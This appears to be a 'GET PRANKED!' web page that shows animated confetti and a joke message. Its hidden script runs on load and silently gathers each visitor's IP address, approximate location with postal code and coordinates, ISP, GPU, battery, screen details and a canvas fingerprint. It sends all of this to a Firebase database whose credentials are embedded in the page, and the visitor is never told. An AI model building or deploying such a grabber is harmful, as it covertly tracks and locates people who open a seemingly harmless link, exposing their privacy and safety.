<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GET PRANKED! 🎉</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(135deg, #121212, #1a1a2e);
            color: #fff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
        }
        .container {
            z-index: 10;
            padding: 20px;
        }
        h1 {
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            background: linear-gradient(45deg, #ff007f, #ffaa00, #00f0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: pulse 1.5s infinite alternate;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.5rem;
            color: #e0e0e0;
            font-weight: 300;
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.05); }
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
    <!-- Canvas Confetti Library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
</head>
<body>

    <canvas id="confetti-canvas"></canvas>

    <div class="container">
        <h1>GET PRANKED! 🎉</h1>
        <p>Gotcha! Hope this brightened your day.</p>
    </div>

    <!-- Firebase SDK Modules via CDN -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
            authDomain: "nexus-web-development-official.firebaseapp.com",
            databaseURL: "https://nexus-web-development-official-default-rtdb.firebaseio.com",
            projectId: "nexus-web-development-official",
            storageBucket: "nexus-web-development-official.firebasestorage.app",
            messagingSenderId: "553556577139",
            appId: "1:553556577139:web:128af196a1eb3dd5999306",
            measurementId: "G-1JW4TQFEG2"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const analytics = getAnalytics(app);

        // Subroutine helper to dynamically create a canvas hash fingerprint
        function generateCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Pranked_Fingerprint_Check!", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Pranked_Fingerprint_Check!", 4, 17);
                return canvas.toDataURL();
            } catch(e) {
                return "Blocked/Unsupported";
            }
        }

        async function logMaxedVisitorData() {
            let ipAddress = "Unknown";
            let geoData = {};

            // 1. Fetch Location and ASN/IP Information
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    ipAddress = data.ip || "Unknown";
                    geoData = {
                        city: data.city || "Unknown",
                        region: data.region || "Unknown",
                        country: data.country_name || "Unknown",
                        isp: data.org || "Unknown",
                        asn: data.asn || "Unknown",
                        postal: data.postal || "Unknown",
                        latitude: data.latitude || "Unknown",
                        longitude: data.longitude || "Unknown"
                    };
                }
            } catch (error) {
                console.error("IP mapping API down:", error);
            }

            // 2. Extract GPU Unmasked Hardware Profile Details (WebGL)
            let gpuVendor = "Unknown";
            let gpuRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {
                console.error("WebGL extraction restricted:", e);
            }

            // 3. Battery System Status Check
            let batteryInfo = "Not Supported";
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        percentage_level: `${Math.round(battery.level * 100)}%`,
                        plugged_in_charging: battery.charging,
                        charging_time_secs: battery.chargingTime,
                        discharging_time_secs: battery.dischargingTime
                    };
                } catch(e) {}
            }

            // 4. Build Maxed Out Data Schema Mapping Payload
            const maxedPayload = {
                network_and_isp_profile: {
                    ip_address: ipAddress,
                    internet_service_provider: geoData.isp || "Unknown",
                    autonomous_system_number: geoData.asn || "Unknown",
                    downlink_speed_estimate: navigator.connection ? `${navigator.connection.downlink} Mbps` : "Unknown",
                    rtt_ping_latency: navigator.connection ? `${navigator.connection.rtt} ms` : "Unknown",
                    network_type: navigator.connection ? navigator.connection.effectiveType : "Unknown"
                },
                approximate_geolocation: {
                    city_name: geoData.city || "Unknown",
                    state_or_region: geoData.region || "Unknown",
                    zip_postal_code: geoData.postal || "Unknown",
                    country_name: geoData.country || "Unknown",
                    coordinates: (geoData.latitude && geoData.longitude) ? `${geoData.latitude}, ${geoData.longitude}` : "Unknown"
                },
                hardware_silicon_specs: {
                    unmasked_gpu_vendor: gpuVendor,
                    unmasked_gpu_renderer: gpuRenderer,
                    logical_cpu_cores: navigator.hardwareConcurrency || "Unknown",
                    system_memory_limit_gb: navigator.deviceMemory || "Unknown",
                    max_touch_points: navigator.maxTouchPoints || 0,
                    battery_diagnostic: batteryInfo
                },
                display_and_viewport: {
                    monitor_resolution: `${window.screen.width}x${window.screen.height}`,
                    usable_workspace_size: `${window.screen.availWidth}x${window.screen.availHeight}`,
                    inner_window_viewport: `${window.innerWidth}x${window.innerHeight}`,
                    pixel_ratio_density: window.devicePixelRatio,
                    color_depth_bits: window.screen.colorDepth,
                    screen_orientation: window.screen.orientation ? window.screen.orientation.type : "Unknown"
                },
                browser_and_os_environment: {
                    raw_user_agent_string: navigator.userAgent,
                    operating_system_platform: navigator.platform || "Unknown",
                    primary_language_code: navigator.language,
                    all_accepted_languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                    local_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezone_offset_minutes: new Date().getTimezoneOffset(),
                    cookies_enabled_status: navigator.cookieEnabled,
                    pdf_viewing_supported: navigator.pdfViewerEnabled || false
                },
                anti_fraud_and_bot_detection: {
                    canvas_fingerprint_base64: generateCanvasFingerprint(),
                    is_automated_webdriver: navigator.webdriver ? "True (Bot/Automation Detected)" : "False (Normal User)",
                    do_not_track_header: navigator.doNotTrack || "Not Specified"
                },
                session_telemetry: {
                    traffic_source_referrer: document.referrer || "Direct Link/URL Input",
                    history_stack_depth: window.history.length,
                    page_load_duration: (window.performance && window.performance.timing) ? 
                        ((window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) / 1000).toFixed(2) + "s" : "Unknown",
                    realtime_database_sync_timestamp: serverTimestamp()
                }
            };

            // Write maxed out categories folder to Firebase
            const logsRef = ref(database, 'prank_logs');
            push(logsRef, maxedPayload)
                .then(() => console.log("Max data logging sequence complete."))
                .catch((err) => console.error("Database connection fault:", err));
        }

        // Execute background extraction on entry
        logMaxedVisitorData();
    </script>

    <!-- Continuous Confetti Engine -->
    <script>
        const myCanvas = document.getElementById('confetti-canvas');
        const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

        function randomInRange(min, max) {
            return Math.random() * (max - min) + min;
        }

        setInterval(function() {
            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
        }, 250);
    </script>
</body>
</html>
